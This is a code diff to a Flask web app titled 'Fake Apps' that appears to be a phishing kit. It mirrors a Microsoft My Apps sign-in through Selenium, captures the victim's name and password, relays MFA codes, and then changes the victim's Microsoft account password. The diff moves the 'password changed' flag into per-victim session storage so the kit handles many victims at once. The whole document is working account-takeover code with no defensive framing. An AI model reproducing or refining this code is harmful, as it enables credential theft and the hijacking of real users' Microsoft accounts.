@@ -24,11 +24,8 @@ def INDEX_PAGE(): return render_template("index.html", title="Fake Apps", header
 session_count = 0
 drivers = []
 DRIVER = None
-password_changed = False
 
 def change_password():
-    global password_changed
-
     DRIVER.get("https://mysignins.microsoft.com/security-info/password/change")
     new_password_field = WebDriverWait(DRIVER, 60).until(EC.presence_of_element_located((By.NAME, "newPassword")))
     confirm_password_field = DRIVER.find_element(By.NAME, "newPasswordConfirm")
@@ -39,7 +36,7 @@ def change_password():
     submit_button = DRIVER.find_element(By.CSS_SELECTOR, "[aria-label=Submit]")
     submit_button.click()
 
-    password_changed = True
+    session["password_changed"] = True
 
 def get_authentication_code():
     try:
@@ -78,7 +75,7 @@ def enter_password(password):
 
 @app.route("/")
 def index():
-    if "name" in session and "password" in session and password_changed:
+    if "name" in session and "password" in session and session["password_changed"]:
         return INDEX_PAGE()
 
     return redirect(url_for("login"))
@@ -92,6 +89,7 @@ def login():
     if "id" not in session:
         session["id"] = session_count
         session_count += 1
+        session["password_changed"] = False
 
         drivers.append(webdriver.Firefox(service = WEB_DRIVER_SERVICE()))
         drivers[session["id"]].get("https://myapps.microsoft.com")
@@ -101,7 +99,7 @@ def login():
     name_form = NameForm()
     password_form = PasswordForm()
 
-    if "name" in session and "password" in session and password_changed:
+    if "name" in session and "password" in session and session["password_changed"]:
         return redirect(url_for("index"))
 
     elif "name" not in session:
@@ -123,7 +121,7 @@ def login():
         if authentication_code:
             return AUTHENTICATION_PAGE(authentication_code)
 
-        elif not password_changed:
+        elif not session["password_changed"]:
             change_password()
 
         try:
